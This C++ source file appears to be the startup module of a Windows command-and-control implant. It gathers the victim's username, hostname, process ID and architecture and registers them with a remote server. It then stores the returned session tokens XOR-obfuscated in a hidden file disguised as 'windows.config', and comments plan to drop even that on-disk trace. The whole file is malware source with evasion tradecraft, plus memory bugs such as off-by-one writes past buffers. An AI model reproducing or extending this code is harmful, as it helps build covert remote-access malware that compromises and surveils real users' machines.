#include "startup.hpp"
#include "apiFunc.hpp"
#include "networkManager.hpp"
#include "bytes.hpp"
//extern "C" {
//	#include "cJSON.h"
//}


#define MAX_FILE_SIZE 500 


void XOR(PCHAR src, SIZE_T size, PCHAR out, UCHAR key) {
	for (int i = 0; i < size; i++) {
		out[i] = src[i] ^ key;
	}
}

/*
	TODO
		remove on disk shit entirley


*/
BOOL init() {
	char Buffer[MAX_PATH];
	WinApis->GetEnvironmentVariableA("APPDATA", Buffer, sizeof(Buffer));
	
	char FullPath[MAX_PATH];

	sprintf_s(FullPath, "%s\\%s", Buffer, "windows.config");
	DWORD Attris = GetFileAttributesA(FullPath);
	if (Attris == INVALID_FILE_ATTRIBUTES) 
		return CollectHostInfo();

	else
		return GrabAuthInfo(FullPath);

}


// Retrieves Auth Data from file on disk, parses and updates Auth Struct
BOOL GrabAuthInfo(char* FilePath) {
	HANDLE hFile = NULL;
	if ((hFile = WinApis->CreateFileA(FilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		return NULL;
	}

	DWORD FileSize = 0;
	FileSize = GetFileSize(hFile, NULL);
	if (FileSize == INVALID_FILE_SIZE || FileSize > MAX_FILE_SIZE) {
		return NULL;
	}
	BYTE buffer[MAX_FILE_SIZE];
	DWORD bytesRead = 0;
	if (!WinApis->ReadFile(hFile, buffer, MAX_FILE_SIZE, &bytesRead, NULL)) {
		return FALSE;
	}
	XOR((PCHAR)buffer, bytesRead, (PCHAR)buffer, 0xFF);
	buffer[bytesRead] = '\0';
	g_Bytes->Set(buffer, bytesRead);

	
	//g_Bytes->index = 0;

	UINT Guidlen = g_Bytes->Read4();
	printf("len -> %d\n", Guidlen);
	PCHAR Guid = AllocMemory<CHAR>(Guidlen);
	g_Bytes->ReadBytes((PBYTE)Guid, Guidlen);
	Guid[Guidlen] = '\0';


	UINT JwtLen = g_Bytes->Read4();
	PCHAR Jwt = AllocMemory<CHAR>(JwtLen);
	g_Bytes->ReadBytes((BYTE*)Jwt, JwtLen);
	printf("JWT -> %s\n", Jwt);

	UINT RefreshLen = g_Bytes->Read4();
	PCHAR Refresh = AllocMemory<CHAR>(RefreshLen);
	g_Bytes->ReadBytes((BYTE*)Refresh, RefreshLen);
	printf("Refresh -> %s\n", Refresh);

	AuthConf->authToken = _strdup(Jwt);
	AuthConf->RefreshToken = _strdup(Refresh);
	AuthConf->guid = _strdup(Guid);
	printf("Guid -> %s\n", Guid);

	g_NetworkManager->UpdateAuthDetails(AuthConf->authToken, AuthConf->RefreshToken, AuthConf->guid);



	CloseHandle(hFile);
	HeapFree(GetProcessHeap(), 0, Jwt);
	HeapFree(GetProcessHeap(), 0, Refresh);
	HeapFree(GetProcessHeap(), 0, Guid);
	return TRUE;

}



char* _GetUserName() {
	DWORD bufferSize = NULL;
	WinApis->GetUserNameA(NULL, &bufferSize);

	char* UserNameBuffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);
	if (!WinApis->GetUserNameA(UserNameBuffer, &bufferSize)) {
		return NULL;
	}

	return UserNameBuffer;
}

char* _GetHostName() {
	DWORD BufSize = NULL;
	WinApis->GetComputerNameA(NULL, &BufSize);

	char* HostName = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BufSize);
	if (!WinApis->GetComputerNameA(HostName, &BufSize)) {
		return NULL;
	}

	return HostName;
}


/*
	TODO
		fix this, handle binaty msg 
*/

BOOL CollectHostInfo() {
#ifdef _DEBUG
	printf("Collecting User Info\n");
#endif
	BOOL ParseAndSaveAuth(PBYTE data, PCHAR Guid, DWORD DataLength);
	
	char* UserName = NULL;
	char* HostName = NULL;

	if ((UserName = _GetUserName()) == NULL) {
#ifdef _DEBUG
		printf("Usernam fail\n");
#endif
		HeapFree(GetProcessHeap(), NULL, UserName);
		return FALSE;
	}

	
	if ((HostName = _GetHostName()) == NULL) {
#ifdef _DEBUG
		printf("hostname fail\n");
#endif
		HeapFree(GetProcessHeap(), NULL, HostName);
		HeapFree(GetProcessHeap(), NULL, UserName);
		return FALSE;
	}
	
	char GUIDBuffer[25];
	GenGuid(GUIDBuffer, 24);
	AuthConf->guid = _strdup(GUIDBuffer);

	DWORD PID = GetCurrentProcessId();
	int isArch64 = (sizeof(void*) != 4);
	PCHAR version = (PCHAR)"1111";

	// total size of binary message
	UINT total_size = 4 + strlen(GUIDBuffer)
		+ 4 + strlen(UserName)
		+ 4 + strlen(HostName)
		+ 4  // PID
		+ 4  // arch
		+ 4 + strlen(version);

	BYTE* binaryBuffer = AllocMemory<BYTE>(total_size);
	g_Bytes->index = 0;
	g_Bytes->Write4(binaryBuffer, strlen(GUIDBuffer));
	g_Bytes->WriteBytes(binaryBuffer, strlen(GUIDBuffer), (BYTE*)GUIDBuffer);

	g_Bytes->Write4(binaryBuffer, strlen(UserName));
	g_Bytes->WriteBytes(binaryBuffer, strlen(UserName), (BYTE*)UserName);

	g_Bytes->Write4(binaryBuffer, strlen(HostName));
	g_Bytes->WriteBytes(binaryBuffer, strlen(HostName), (BYTE*)HostName);

	DWORD ProcessID = GetProcessId(GetCurrentProcess());

	g_Bytes->Write4(binaryBuffer, ProcessID);
	g_Bytes->Write4(binaryBuffer, isArch64);

	g_Bytes->Write4(binaryBuffer, strlen(version));
	g_Bytes->WriteBytes(binaryBuffer, strlen(version), (BYTE*)version);


	char BinaryResponse[1024];
	DWORD ResponseLength = 0;

	if (!g_NetworkManager->RegisterClient((BYTE*)binaryBuffer, total_size, BinaryResponse, sizeof(BinaryResponse), &ResponseLength)) {

		return FALSE;
	}

	

	printf("%lu\n", ResponseLength);
	if (ResponseLength > 0) {
		if (!ParseAndSaveAuth((PBYTE)BinaryResponse, GUIDBuffer, ResponseLength)) return FALSE;
	}
	HeapFree(GetProcessHeap(), NULL, HostName);
	HeapFree(GetProcessHeap(), NULL, UserName);
	return TRUE;


}






BOOL ParseAndSaveAuth(PBYTE data, PCHAR Guid, DWORD DataLength) {

	unsigned char key = 0xFF;
	char PathBuffer[MAX_PATH];
	WinApis->GetEnvironmentVariableA("APPDATA", PathBuffer, sizeof(PathBuffer));
	char FullPath[260];

	sprintf_s(FullPath, "%s\\%s", PathBuffer, "windows.config");
	HANDLE hFile; 
	if ((hFile = WinApis->CreateFileA(FullPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL)) == INVALID_HANDLE_VALUE) {
		return FALSE;
	}
	printf("Opened File\n");

	g_Bytes->Set(data, DataLength);


  /*
    server sends us
	[Success/Error 4 bytes]
	[JWT Len 4 bytes]
	[JWT N bytes]
	[RefreshLen 4 bytes]
	[refresh N bytes]
	-----------------
	Gets saved as
	[guidlen 4 bytes]
	[guid 4 bytes]
	[JWT Len 4 bytes]
	[JWT N bytes]
	[RefreshLen 4 bytes]
	[refresh N bytes]
*/


	g_Bytes->index = 0;
	UINT ErrorCodeCheck = g_Bytes->Read4();
	if (ErrorCodeCheck > 0) {
		WinApis->CloseHandle(hFile);
		return FALSE;
	}

	UINT JwtLen = g_Bytes->Read4();
	printf("JwtLen -> %d\n", JwtLen);
	PCHAR Jwt = AllocMemory<CHAR>(JwtLen);;

	g_Bytes->ReadBytes((BYTE*)Jwt, JwtLen);
	printf("511");

	UINT RefreshLen = g_Bytes->Read4();
	PCHAR Refresh = AllocMemory<CHAR>(RefreshLen);


	g_Bytes->ReadBytes((BYTE*)Refresh, RefreshLen);

	AuthConf->authToken = _strdup(Jwt);
	AuthConf->RefreshToken = _strdup(Refresh);

	g_NetworkManager->UpdateAuthDetails(AuthConf->authToken, AuthConf->RefreshToken, AuthConf->guid);
	printf("JWT -> %s\n", Jwt);
	printf("Refresh -> %s\n", Refresh);
	printf("Guid -> %s\n", Guid);

	g_NetworkManager->UpdateAuthDetails(AuthConf->authToken, AuthConf->RefreshToken, AuthConf->guid);
	

	char buf[MAX_FILE_SIZE];
	
	INT TotalSize = DataLength + 4 + strlen(Guid); // + 4 for GuidLen 
	PBYTE DataBuf = AllocMemory<BYTE>(TotalSize);
	g_Bytes->index = 0;
	g_Bytes->Write4(DataBuf, strlen(Guid));
	g_Bytes->WriteBytes(DataBuf, strlen(Guid), (PBYTE)Guid);
	g_Bytes->Write4(DataBuf, JwtLen);
	g_Bytes->WriteBytes(DataBuf, JwtLen, (PBYTE)Jwt);
	g_Bytes->Write4(DataBuf, RefreshLen);
	g_Bytes->WriteBytes(DataBuf, RefreshLen, (PBYTE)Refresh);

	XOR((PCHAR)DataBuf, TotalSize, buf, 0xFF);

	
	HeapFree(GetProcessHeap(), 0, Jwt);
	HeapFree(GetProcessHeap(), 0, Refresh);
	HeapFree(GetProcessHeap(), 0, DataBuf);

	return WinApis->WriteFile(hFile, buf, TotalSize, NULL, NULL);
}





void GenGuid(char* str, size_t len) {
	const char chars[] =
		"ABCDEFGHIJKLMNOPQRSTUV"
		"1234567890"
		"abcdefghijklmnopqrstuv";

	size_t charsetSize = sizeof(chars) - 1;
	srand((unsigned int)time(NULL));

	for (int i = 0; i < len; i++) {
		if (i == 8 || i == 16) {
			str[i] = '-';
			continue;
		}
		int key = rand() % charsetSize;
		str[i] = chars[key];
	}
	str[len] = '\0';
}

const char* is32or64(int num) {
	return (num == 1) ? "x64" : "x86";
}

